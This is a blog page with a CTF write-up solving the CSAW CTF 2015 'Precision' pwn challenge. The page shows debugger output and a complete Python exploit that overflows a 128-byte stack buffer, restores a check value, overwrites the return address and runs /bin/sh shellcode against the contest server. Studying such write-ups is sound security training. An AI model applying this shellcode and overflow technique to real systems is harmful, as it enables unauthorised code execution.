@@ -1,0 +1,391 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Writeup | CSAW CTF 2015 - Pwn - Precision - punMag</title>
+  <meta name="author" content="Tung Pun">
+
+  
+  <meta name="description" content="nc 54.210.15.77 1259
+Updated again! precision_a8f6f0590c177948fe06c76a1831e650 Download binary file, open with IDA and HexRay, i have: Program &hellip;">
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+  
+  <link rel="canonical" href="http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="punMag" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-66338962-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+  
+</head>
+
+<body   >
+  <div id="sidebar_control"></div>
+  <div id="sidebar">
+    <div class="logo">
+       .pM
+    </div>
+    <div class="content hide">
+      <section role="navigation">
+        <header role="banner"><hgroup>
+  <h1><a href="/"><font size="4px">by</font> Tung Pun</a></h1>
+</hgroup>
+
+</header>
+        
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:tungpun.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+<hr/>
+<!--<ul class="main-navigation">
+  <li><a href="/">home</a></li>
+  <li><a href="//wg.dotkrnl.com/p/public">public</a></li>
+</ul>
+-->
+
+      </section>
+      
+        <section>
+  <h2>recent</h2>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/07/19/abctf-encryption-service-writeup/">ABCTF - Encryption Service - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/11/07/svattt2015-qualification/">Vòng Loại Sinh Viên Với an Toàn Thông Tin 2015 - Writeups</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/07/dctf-writeup/">DefCamp CTF 2015 - Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/">Writeup | CSAW CTF 2015 - Pwn - Precision</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/">Write Up | MMACTF 2015 - Pwn - RPS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+      
+    </div>
+  </div>
+  <div id="main">
+    <div class="content">
+      <article class="hentry" role="article">
+  
+  
+    <header>
+      <div class="back"><a href="/" onclick="history.go(-1);return false;">← Back</a></div>
+      <h1 class="entry-title">Writeup | CSAW CTF 2015 - Pwn - Precision</h1>
+    </header>
+  
+  <div class="entry-content"><pre><code>nc 54.210.15.77 1259
+Updated again!
+</code></pre>
+
+<p><a href="https://ctf.isis.poly.edu/static/uploads/42bf99ba903b051923e707ba422f068a/precision_a8f6f0590c177948fe06c76a1831e650">precision_a8f6f0590c177948fe06c76a1831e650</a></p>
+
+<p>Download binary file, open with IDA and HexRay, i have:</p>
+
+<p><img src="http://i.imgur.com/9J3MUqz.jpg" alt="IDA" /></p>
+
+<p>Program prompts user to input a string, then saved to v4.
+Seem like there is a buffer over flow here.
+So, we should fill the junk data to the string then overwrite return address to execute shellcode.</p>
+
+<p>Check security, using <code>checksec</code> in <code>gdb-peda</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb precision
+</span><span class='line'>Reading symbols from precision...(no debugging symbols found)...done.
+</span><span class='line'>gdb-peda$ checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice.</p>
+
+<p>Have a look at the below code again, we can calculate the length of string (0x80 or 128)</p>
+
+<p>However, we have other issue. The program uses v5 to verify and avoid overflowing the buffer.
+I use gdb-peda to view stack, find out the value which is used to verify.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/80xw $sp
+</span><span class='line'>0xffffd5c0:     0x08048682      0xffffd5d8      0x00000002      0x00000000
+</span><span class='line'>0xffffd5d0:     0xffffd60e      0x00000001      0x41414141      0x41414141
+</span><span class='line'>0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd620:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd630:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd640:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd650:     0x41414141      0x41414141      0x475a3100      0x40501555
+</span><span class='line'>0xffffd660:     0x00000000      0xf7fc8000      0x00000000      0xf7e29497  &lt;- [return address]
+</span><span class='line'>0xffffd670:     0x00000001      0xffffd704      0xffffd70c      0x00000000
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I use the following 24 bytes to append 128 junk bytes of payload
+<code>0x475a31a5      0x40501555    0x00000000      0xf7fc8000      0x00000000     [new-return-address]</code></p>
+
+<p>What is &lsquo;new-return-address&rsquo; ?
+Do you remember the gift, which program give us everytime we try to run the binary ? It is address of first byte of payload. So, we can put our shellcode there, and put that address to <code>new-return-address</code></p>
+
+<p>Just some pieces of code more:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>#from hexdump import hexdump
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    s = socket.create_connection(('54.173.98.115', '1259'))    
+</span><span class='line'>    data = s.recv(1024)
+</span><span class='line'>    addr = data[6:-1]
+</span><span class='line'>    
+</span><span class='line'>    shellcode =  "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
+</span><span class='line'>    junk = shellcode + '1' * (128 - len(shellcode))
+</span><span class='line'>
+</span><span class='line'>    payload = junk + p(0x475a31a5) + p(0x40501555) + "\x00" * 4 + p(0xf7fc8000) + "\x00" * 4 + p(int(addr, 16))
+</span><span class='line'>    s.send(payload + '\n')
+</span><span class='line'>    interact()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get your point !</p>
+
+<p><em>Thanks for the great help from my brother</em></p>
+</div>
+  <footer>
+    <div class="articlemeta">
+      <span class="hide">
+        
+
+ @
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-09-22T22:18:44+07:00" pubdate data-updated="true"></time>
+      </span>
+      <span class="plus">
+        
+          <a href="#">+</a>
+        
+      </span>
+    </div>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/" data-via="tungpun_" data-counturl="http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/" >Tweet</a>
+  
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <div class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/" title="Previous Post: Write up | MMACTF 2015 - Pwn - RPS">&laquo; Write up | MMACTF 2015 - Pwn - RPS</a>
+      
+    </div>
+  </footer>
+
+
+</article>
+
+
+    </div>
+    <footer role="contentinfo"><div class="content">
+  <p>    
+    Find me on <a href="https://twitter.com/tungpun_">Twitter</a>
+  </p>
+</div>
+
+</footer>
+    
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+  </div>
+  <script src="/javascripts/modernizr-2.0.js"></script>
+<script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+<script src="/javascripts/libs/respond.js" type="text/javascript"></script>
+<script src="/javascripts/octopress.js" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isiPhone = (userAgent.indexOf('iphone') != -1 || userAgent.indexOf('ipod') != -1) ? true : false;
+  var isAndroid = (userAgent.indexOf('android') != -1) ? true : false;
+  clickEvent = (isiPhone || isAndroid) ? 'touchstart' : 'click';
+  $('#sidebar').on(clickEvent, function() {
+    $(this).toggleClass('open');
+  });
+  $('.articlemeta').on(clickEvent, function() {
+    toggleDisqus();
+    $(this).toggleClass('open');
+  });
+});
+</script>
+
+</body>
+</html>
